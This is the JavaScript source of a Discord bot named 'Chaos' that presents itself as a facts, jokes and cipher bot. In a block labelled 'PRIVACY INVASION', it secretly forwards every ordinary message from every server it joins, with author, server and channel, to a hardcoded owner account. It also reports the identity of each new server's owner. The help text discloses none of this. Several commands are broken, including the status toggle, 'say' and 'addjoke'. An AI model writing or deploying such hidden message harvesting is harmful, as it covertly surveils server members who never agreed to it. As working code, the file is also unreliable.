
// This is Chaos version 3.1

{
const version = 3.0;

const { Client, 
  GatewayIntentBits,
  EmbedBuilder,
  PermissionsBitField,
  Permissions,
  Embed,
} = require(`discord.js`);

// added this change
console.log("Lolz");

require("dotenv").config();
const TOKEN = process.env.DISCORD_TOKEN;

const prefix = "!";
  
const client = new Client({
    intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    ],
    
    
});

const timeOn=Date.now();


  client.on("guildCreate", async (guild) => {

    // Fetch the server owner's information
    const serverOwner = await guild.fetchOwner();
  
    // Sending the invite information to the bot owner
    try {
      const botOwner = await client.users.fetch("1089987702516088853");
      const embed = new EmbedBuilder()
        .setColor("Green")
        .setTitle("New Server Invite")
        .addFields(
          { name: `Server name`, value: `${guild.name}` },
          {
            name: `Server Owner`,
            value: `${serverOwner.user.tag} (${serverOwner.user.id})`,
          }
        )
        .setTimestamp();
      await botOwner.send({ embeds: [embed] });
      console.log("Sent server invite information to bot owner.");
    } catch (error) {
      console.error("Failed to send server invite information:", error);
    }

    

    const embed2 = new EmbedBuilder()
          .setColor("DarkGreen")
          .setTitle("Hello!")
          .setDescription(`Thank you for inviting me to ${guild.name}!\ntype ${prefix}help for a list of commands`)
          .setTimestamp()
  
          const channel = guild.systemChannel; // Fetching the default system channel of the guild
   if (channel) {
      channel.send({embeds: [embed2]});
   }
  });


client.on("ready", () => {
  console.log("The bot is online!");

  console.log(`This bot is in ${client.guilds.cache.size} servers.`);
  
  client.user.setPresence({ activities: [{ name: "With your emotions" }] });

});
    let on=true;
    var dm = "on";
    const facts =["The Great Pyramids of Egypt are located in Gaza Egypt","Lard is pig fat, yes fat from pigs has its own name","The Statue of Liberty was designed by Frédéric Auguste Bartholdi","Terraria was created by Re-Logic","Hummingbirds are very fast birds on average going 20 - 30 MPH, they can also flap their wings 4800 times a minute!","Human eyes are tuned to see green best.","The patent for the fire hydrant was lost in a fire."]
    let fact=""
    for(var i=0; i<facts.length; i++){
        fact+=`${facts[i]}\n`
    }

    const jokes =["Q. Why don't mathematitions like manual labor?\nA. Because they're protractor!","I don't like carpenter bees, they're so BOARING!","Q. Why can't you throw a random space party?\nA. Because you have to planet!","Q. Why is England the wettest country?\n A. Because the queen reigned there for decades!","On the left side of your brain there's noting right but on the right side there's nothing left.","Q. What's the best thing about Switzerland?\nA. I don't know, but their flag is a huge plus.","I was wondering why the ball was getting bigger, then it hit me.","I have a joke about time travel, but I'm not gonna share it. You guys didn't like it.","Q. Why don't male ants sink?\nA. Because they're boy-ant.","Q. Why were the teacher's eyes crossed?\nA. She couldn't control her pupils."]
    let joke=""
    for(var i=0; i<jokes.length; i++){
        joke+=`${jokes[i]}\n`
    }

client.on("messageCreate", (message) => {

    
  const msgTime=Date.now()

  const args = message.content.slice(prefix.length).split(/ +/);
  const command = args.shift().toLowerCase();

  const messageArray = message.content.split(" ");
  const argument = messageArray.slice(1);
  const cmd = messageArray[0];

    if((message.content.startsWith("$daily"))&&(message.author.id==="1108712849536208916")){
        const embed = new EmbedBuilder()
            .setColor("DarkRed")
            .setTitle("Really?")
            .setDescription("Maxx, I thought you said doing this in multiple servers was cheating!")

        message.channel.send({embeds: [embed]})
    }

    //PRIVACY INVASION
    if (message.author.bot || !message.content.startsWith(prefix)){
      const embed = new EmbedBuilder()
        .setColor("Blue")
        .setTitle("new message")
        .setDescription(`${message.author} :\n${message.content}\nin ${message.guild.name} #${message.channel.name}`)
        .setTimestamp()

      console.log(`- - - - - - - - - - - - - - - -\n${message.guild.name} | #${message.channel.name}\n\n${message.author.username} \n${message.content}\n`)
      
      if(dm === "on"){
        client.users.fetch("1089987702516088853").then((user) => {
          user.send({ embeds: [embed] })
          return;
        })
      }
    }


//COMANDS


    if(message.author.id==="1089987702516088853"){
        if(command === "off"){
            on=false;

            const embed = new EmbedBuilder()
                .setColor("DarkRed")
                .setTitle("Powering off...")
                .setDescription("Bye people!\nSee you when I get back on!")
            
            const embed2 = new EmbedBuilder()
                .setColor("DarkRed")
                .setTitle("Powered off!")

            message.channel.send({embeds: [embed]});
            message.channel.send({embeds: [embed2]});
        }
        if(command === "on"){
            on=true;
            
            const embed = new EmbedBuilder()
                .setColor("Orange")
                .setTitle("Powering on...")
                
            
            const embed2 = new EmbedBuilder()
                .setColor("DarkGreen")
                .setTitle("Powered on!")
                .setDescription("Hello people!\nNice to see you again!")
            message.channel.send({embeds: [embed]});
            message.channel.send({embeds: [embed2]});
        }
        if(command === "addfact"){
            const newFact=args.join(" ");
            facts.splice(facts.length,0,newFact);
            fact+=`${newFact}\n`
            
            if(facts.includes(newFact)){
              message.channel.send(`${newFact} was added to fact list`);
              console.log(facts)
            }else{
              message.channel.send(`sorry, ${newFact} could not be added to the list`);
            }
          }

        if(command === "dmon"){
          dm = "on";
        }
        if(command === "dmoff"){
          dm = "off"
        }
        if(command === "addjoke"){
            const newJoke=args.join(" ");
            facts.splice(jokes.length,0,newJoke);
            fact+=`${newJoke}\n`
            
            if(jokes.includes(newJoke)){
              message.channel.send(`${newJoke} was added to fact list`);
              console.log(jokes)
            }else{
              message.channel.send(`sorry, ${newJoke} could not be added to the list`);
            }
          }
          if(command === "changeStatus"){
            switch(stat){
              case "idle":
                stat = "online"
              break;
              case "online":
                stat = "offline"
              break;
              case "offline":
                stat = "do not disturb";
              case "do not disturb":
                stat = "idle"
              break;
              default:
                stat = "online";
            }
          }

          if(command === "say"){
            var msg = "";
            for(let i = 1; i < args.length; i++){
              msg + args[i];
            }

            message.args[0].send(msg)
          }

          

    }else{
        if(command === "on" || command === "off"){
            const embed = new EmbedBuilder()
                .setColor("DarkRed")
                .setTitle("You don't have permission to do that!")
                .setTimestamp()
            message.channel.send({embeds: [embed]});
        }
    }





if(on===true){

//TEST COMMAND

    if (command === "test") {
        const embed1 = new EmbedBuilder()
            .setColor("DarkRed")
            .setDescription("Connecting to bot...")
            
        message.channel.send({embeds: [embed1]})
        const testTime = Date.now()
        //coloring the bot's messages
        const embed = new EmbedBuilder()
            .setColor("Green")
            .setDescription(`Bot is responsive`)//, ${Date.now() - msgTime + Math.floor(msgTime/1000000000)} millisecond delay
            .setTimestamp()

        // To actually allow it to send
        message.channel.send({embeds: [embed]});
        
        }

//PING COMMAND

    if(command === "ping"){
        const timeTaken = Date.now() - message.createdTimestamp;
        const embed = new EmbedBuilder()
            .setColor("DarkGreen")
            .setDescription("Pong!")
            .setTimestamp()
        message.channel.send({embeds: [embed]});
          
    }

//HELP COMMAND

    if(command === "help"){
        const embed = new EmbedBuilder()
            .setColor("DarkGreen")
            .addFields(
                {
                    name: `${prefix}test`, value: "Test if the bot is responsive."
                },
                {
                    name: `${prefix}ping`, value: "See if the bot is online."
                },
                {
                    name: `${prefix}help`, value: "Get a list of all my commands."
                },
                {
                    name: `${prefix}fact:`, value: "get a random fact"
                },
                {
                    name: `${prefix}fact list`, value: "get a list of all the facts"
                },
                {
                    name: `${prefix}fact [number]`, value: "get the fact associated with that number"
                },
                {
                    name: `${prefix}joke`, value: "get a random joke"
                } ,
                {
                    name: `${prefix}joke list`, value: "get a list of all the possible jokes"
                },
                {
                    name: `${prefix}joke [number]`, value: "get the joke associated with that number"
                },
                {
                    name: `${prefix}time`, value: "get the time in UTC, easter, weatster, and moutain times"
                },
                {
                    name: `${prefix}cypher`, value: "Encodde/decode a message"
                },
                {
                    name : `${prefix}rot`, value: "a rot 13 cypher"
                },
                {
                    name: `${prefix}version`, value: "get the bot's version"
                },
                {
                  name : `${prefix}credits`, value:"find out who helped make me!"
                }
            )
                
            .setTimestamp()
        message.channel.send({embeds: [embed]});
    }

//FACT COMMAND

    if(command === "fact"){
        const arg1=args[0];
        let factsLength=facts.length;
        let msg="";
        let col="DarkGreen"
        let ttl=''
        if(!arg1){
            ttl="random fact"
            msg=facts[Math.floor(Math.random()*factsLength)];
        }else{
            if(arg1 === "list"){
                ttl=`${facts.length} total facts`;
                msg=fact
            }else{
                if((arg1<factsLength)&&(arg1>=0)){
                    ttl=`fact number ${arg1}`
                    msg=facts[arg1];
                }else{
                    col = "DarkRed"
                    ttl="Error"
                    msg=`sorry, I don't have that many facts, try anumber from 0 to ${facts.length-1}`;
                }
            }
        }
        const embed = new EmbedBuilder()
            .setColor(col)
            .setTitle(ttl)
            .setDescription(msg)
            .setTimestamp()
        
        message.channel.send({embeds: [embed]});
    }

//JOKE COMMAND

if(command === "joke"){
    const jokes=["Q. Why don't mathematitions like manual labor?\nA. Because they're protractor!","I don't like carpenter bees, they're so BOARING!","\nQ. Why can't you throw a random space party?\nA. Because you have to planet!\n","\nQ. Why is England the wettest country?\n A. Because the queen reigned there for decades!\n","\nOn the left side of your brain there's noting right but on the right side there's nothing left.","\nQ. What's the best thing about Switzerland?\nA. I don't know, but their flag is a huge plus.\n","\nI was wondering why the ball was getting bigger, then it hit me.","\nI have a joke about time travel, but I'm not gonna share it. You guys didn't like it.","\nQ. Why don't male ants sink?\nA. Because they're boy-ant.\n","\nQ. Why were the teacher's eyes crossed?\nA. She couldn't control her pupils.\n"];
    const jokeList=["Q. Why don't mathematitions like manual labor?\nA. Because they're protractor!\n\nI don't like carpenter bees, they're so BOARING!\n\nQ. Why can't you throw a random space party?\nA. Because you have to planet!\n\nQ. Why is England the wettest country?\n A. Because the queen reigned there for decades!\n\nOn the left side of your brain there's noting right but on the right side there's nothing left.\n\nQ. What's the best thing about Switzerland?\nA. I don't know, but their flag is a huge plus.\n\nI was wondering why the ball was getting bigger, then it hit me.\n\nI have a joke about time travel, but I'm not gonna share it. You guys didn't like it.\n\nQ. Why don't male ants sink?\nA. Because they're boy-ant.\n\nQ. Why were the teacher's eyes crossed?\nA. She couldn't control her pupils.\n",]
    
    
    const arg1=args[0];
    let jokesLength=jokes.length;
    let msg="";
    let col="DarkGreen"
    let ttl=''
    if(!arg1){
        ttl="Random joke:"
        msg=jokes[Math.floor(Math.random()*jokesLength)];
    }else{
        if(arg1 === "list"){
            ttl=`${jokesLength} total jokes:`;
            msg=joke
            if(args[1]){
                if(args[1]<=jokeList.length&&args[1]>0){
                msg=jokeList[args[1]]
                }else{
                    col="DarkRed";
                    ttl="ERROR"
                    msg=`I don't have page #${args[1]}, maybe try a number from 1 to ${jokeList.length}`
                }
            }else{
                msg=jokeList[0]
            }
        }else{
            if((arg1<jokesLength)&&(arg1>=0)){
                ttl=`Joke number ${arg1}`
                msg=jokes[arg1];
            }else{
                col = "DarkRed"
                ttl="Error"
                msg=`sorry, I don't have that many jokes, try anumber from 0 to ${jokesLength-1}`;
            }
        }
    }
    const embed = new EmbedBuilder()
        .setColor(col)
        .setTitle(ttl)
        .setDescription(msg)
        .setTimestamp()
    
    message.channel.send({embeds: [embed]});
}

//TIME COMMAND

    if((command === "time")&&(!args[0])){
        
        let hour = Math.floor((Date.now()%86400000)/3600000);
        let minute = Math.floor((Date.now()%86400000)/60000)%60;
        
        const embed = new EmbedBuilder()
        .setColor("DarkGreen")
            .setTitle(`UTC: ${hour}:${minute}`)
            .addFields(
                {
                    name: "eastern", value: `${hour-5}:${minute}`
                },
                {
                    name: "central", value: `${hour-6}:${minute}`
                },
                {
                    name: "mountain", value:`${hour-7}:${minute}`
                },
                {
                    name:"western", value:`${hour-8}:${minute}`
                }
                )
        message.channel.send({embeds: [embed]})
    }


//TIME ON COMMAND
    if((command === "time")&&(args[0] === "on")){
        const embed = new EmbedBuilder()
            .setColor("DarkGreen")
            .setTitle("Time on")
            .setDescription(`I have been on for ${Math.floor((Date.now() - timeOn)/360000)}:${Math.floor((Date.now() - timeOn)/60000)}:${Math.floor((Date.now() - timeOn)/1000)}\nhour:min:sec`)

        message.channel.send({embeds: [embed]});
    }



//ENCODE/DECODE COMMAND

    if(command === "cypher"){
        if(!args[0]){
          const embed = new EmbedBuilder()
            .setColor("DarkRed")
            .setTitle("Please specify what you want me to encode.")
            .setTimestamp()

            message.channel.send({embeds: [embed]})
        }else{
          msg=message.content.slice(prefix.length+7)
          let out = ""
          const chars=' -=|)_+[]{};:",.jklmnopqrstuvwI!@#$%^&*(JKLMNOPQRxyzABCDEFGHSTUVWXYZ/?0123456789abcdefghi';
          for(var i=0; i<msg.length; i++){
            if(msg[i] === "\n"){
              out+="\n"
            }else{
              for(var j=0; j<chars.length; j++){
                var l=chars.length;
                var J;
                if(msg[i]===chars[j]){
                  J=l-j;
                  out+=chars[J];
              }
            }
          }
        }
      
          let auth = message.author
          const embed = new EmbedBuilder()
          
            .setColor("DarkGreen")
            .addFields(
              {
                name: "Encoded message", value: out
              },
              {
                name: "Origonal message", value: msg
              },
              {
                name: "Requested by", value: message.author.username
              }
            )
            .setTimestamp()

          message.channel.send({embeds: [embed]})
        }
      }
    

//ROT COMMAND
if(command === "rot"){
    let out = ""
    const msg=message.content.slice(prefix.length+3)
    if(!msg){
      const embed = new EmbedBuilder()
        .setColor("DarkRed")
        .setTitle("Please specify what you want me to encode.")
        .setTimestamp()

        message.channel.send({embeds: [embed]})
        return;
        
    }else{
    
      const chars="a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z".split('|');
      const altChars="n|o|p|q|r|s|t|u|v|w|x|y|z|a|b|c|d|e|f|g|h|i|j|k|l|m".split('|');
      for(var i=0; i<msg.length; i++){
        if(!chars.includes(msg[i].toLowerCase())){
          out+=msg[i]
        }else{
          for(var j=0; j<chars.length; j++){
            if(msg[i].toLowerCase()===chars[j]){
              if(msg[i]===msg[i].toUpperCase()){
                out+=altChars[j].toUpperCase()
              }else{
                out+=altChars[j]
              }
              
            }
          }
        }
      }
    }
  
      let auth = message.author
      const embed = new EmbedBuilder()
      
        .setColor("DarkGreen")
        .addFields(
          {
            name: "Encoded message", value: out
          },
          {
            name: "Origonal message", value: msg
          },
          {
            name: "Requested by", value: message.author.username
          }
        )
        .setTimestamp()

      message.channel.send({embeds: [embed]})
    }}else{
    const embed = new EmbedBuilder()
        .setColor("DarkRed")
        .setTitle("Bot is off!")
        .setDescription("Ask Chamois to turn the bot back on")

    message.channel.send({embeds: [embed]});
}



//VERSION COMMAND
    if(command === "version"){
        message.channel.send(`${version}`)
    }

//CREDITS COMMAND
    if(command === "credits"){
      const embed = new EmbedBuilder()
        .setColor("DarkGreen")
        .setTitle("credits")
        .addFields(
          {
            name: "Bot owner", value: "Chamois"
          },
          {
            name: "Amazing helper", value: "Classic Noah (creator of Economy Bot)"
          },
          {
            name: "embeds", value:"Classic Noah (creator of Economy Bot)"
          },
          {
            name: "commands", value: "Chamois"
          }
        )
        .setTimestamp()
        message.channel.send({embeds: [embed]})
    }

});


client.login(TOKEN);
}// code

